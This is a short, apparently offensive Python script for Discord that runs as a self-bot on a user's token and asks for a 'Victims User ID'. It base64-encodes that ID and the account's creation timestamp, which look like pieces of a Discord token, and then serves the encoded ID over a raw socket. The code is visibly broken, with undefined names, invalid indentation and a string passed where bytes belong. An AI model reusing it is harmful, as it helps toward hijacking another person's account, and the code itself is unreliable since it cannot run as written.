import discord
import string
import requests as req
import datetime
import random
import time
import base64
from threading import Thread as thr
import os
from colorama import Fore
import discord, os, json
from discord.ext import commands
from discord.ext.commands import Bot
from plyer import notification

token = input(f"Put Your Token Here: ")
os.system('cls')
def notif(title, message):
    notification.notify(
        title = title,
        message = message,
        )
class MyClient(discord.Client):
  async def on_ready(self):
    userid = input(f"Put The Victims User ID Here: ")
    user = await client.fetch_user(int(userid))
    stamp = user.created_at
    timestamp = str(time.mktime(stamp.timetuple()))
    print(timestamp)
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
    encodedstamp = str(encodedBytes, "utf-8")
    time.sleep(3)
        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()
            conn, addr = s.accept()
            with conn:
            print('Connected by', addr)
            while True:
            conn.sendall(encodedid)
client = MyClient()
client.run(token, bot=False)
